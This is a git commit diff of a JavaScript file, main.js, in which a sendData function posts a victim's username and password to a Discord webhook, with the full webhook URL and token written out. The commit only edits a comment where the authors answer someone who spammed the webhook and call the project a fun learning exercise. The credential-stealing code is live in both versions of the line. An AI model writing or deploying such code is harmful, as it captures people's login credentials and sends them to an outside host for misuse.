b5adf1f991cd9938918e02e135adce720f4ce6cb
myxt-bots <119824075+myxt-bots@users.noreply.github.com>
2022-12-05 20:25:51 -0800

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
 function sendData(User, Pass) {
-    $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8', -- to the guy that spammed us, read readme.md for me. this is a project me and a friend are working on for fun for christs sake. you blew up our phones during school to troll some kids trying to learn code? are you that low?
+    $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8', //to the guy that spammed us, read readme.md for me. this is a project me and a friend are working on for fun for christs sake. you blew up our phones during school to troll some kids trying to learn code? are you that low?
     {
         'username': 'We got him :)',
         'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
